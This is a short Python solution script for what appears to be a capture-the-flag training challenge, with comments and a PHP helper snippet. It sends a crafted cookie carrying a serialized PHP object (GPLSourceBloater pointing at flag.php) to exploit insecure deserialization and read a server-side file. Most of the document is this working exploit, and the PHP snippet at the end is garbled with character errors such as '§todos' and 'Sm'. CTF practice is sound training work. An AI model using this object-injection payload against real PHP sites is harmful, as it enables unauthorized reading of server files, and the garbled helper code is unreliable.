import requests

url = 'http://free.training.jinblack.it/'

cookie = {'todos': '760463360e4919ca238d1566fc26661fa:1:{i:0%3bO:16:"GPLSourceBloater":1:{'
                   's:6:"source"%3bs:8:"flag.php"%3b}}'}

r = requests.get(url, cookies=cookie)

# the flag is in here
print(r.text)

# Explanation:

# The cookie is a serialized object of type GPLSourceBloater, which is a class defined in the source code.
# The class has a single attribute called source, which is the name of the file to be read.
# The file is read and its content is printed.
# The flag is in the file flag.php.

""" <!DOCTYPE html>
<html>
<body>
<?php
Class GPLSourceBloater{
}
$s = new GPLSourceBloater() ;
$s->source = "flag. php" ;
    §todos [] = $s;
    $m = serialize($todos) ;
    $h = md5 (Sm) ;
echo Sh. Sm;
?>
</body> </html> """

# Execute the script in a PHP interpreter to get the flag.